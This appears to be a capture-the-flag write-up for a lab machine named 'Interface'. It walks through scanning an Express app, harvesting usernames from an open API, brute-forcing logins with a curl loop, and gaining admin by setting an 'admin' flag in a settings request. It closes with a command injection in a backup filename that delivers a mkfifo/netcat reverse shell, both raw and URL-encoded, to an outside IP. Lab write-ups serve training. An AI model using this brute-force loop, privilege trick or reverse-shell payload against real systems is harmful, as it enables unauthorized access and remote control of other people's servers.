# Interface

### Enumeration

```
80/tcp open  http    Node.js Express framework
|_http-title: App
|_http-favicon: Unknown favicon MD5: 1FBDF735A0DD3E8321C5E0828A45A4D5
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

**Burp Suite -> Proxy History ->** `GET /api/users HTTP/1.1`

It returns JSON, it contains 2000 usernames.

Saved to this file. -> usernames.txt

We need to tidy them.

```
$ cat usernames.txt | sed 's/,//g' | sed 's/""/\n/g' > usernames
```

Brute force with users -> using password as password

```
$ while read line; do curl -s -X POST -H 'Content-Type: application/json' --data-binary "{\"username\":\"$line\",\"password\":\"password\"}" http://192.168.145.106/login | grep -v Unauthorized && echo $line; done < usernames
OK
[REDACTED]
```

**Alternative way:**

Using Burp Suite Professional

Login -> \[REDACTED]:password

Exploring website -> You can see the workflow

```
POST /api/settings HTTP/1.1
...
{"color-theme":"dark"}

GET /api/settings HTTP/1.1
...
{"color-theme":"dark","lang":"en","admin":false}
```

**PrivEsc for our user:**

```
POST /api/settings HTTP/1.1
...
{"color-theme":"dark","admin":"true"}
```

```
GET /api/backup?filename=test HTTP/1.1

In the response:
Created backup: /var/log/app/logfile-test.gz
```

Archiving with gunzip - may be there is os command inj?

### Access

OS Command Inj with using: **`;`**

https://www.revshells.com/ - nc mkfifo 192.168.49.145 80 bash

URL Encode Key Characters OR URL Encode All Chars

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.49.145 80 >/tmp/f
```

```
GET /api/backup?filename=;+rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|bash+-i+2>%261|nc+192.168.49.145+80+>/tmp/f; HTTP/1.1
```
